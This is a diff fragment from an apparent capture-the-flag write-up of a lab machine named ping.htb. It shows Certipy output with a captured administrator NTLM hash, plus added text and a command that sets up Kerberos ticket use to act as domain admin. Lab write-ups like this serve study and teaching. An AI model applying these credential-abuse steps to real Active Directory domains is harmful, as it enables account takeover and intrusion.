@@ -1282,7 +1282,13 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
 ```
 
-Ill then auth and get a TGT and the NL
+Ill then auth and get a TGT and the NTLM of the DA
+
+```python
+❯❯❯ export KRB5CCNAME=administrator.ccache
+
+
+```
 
 
 
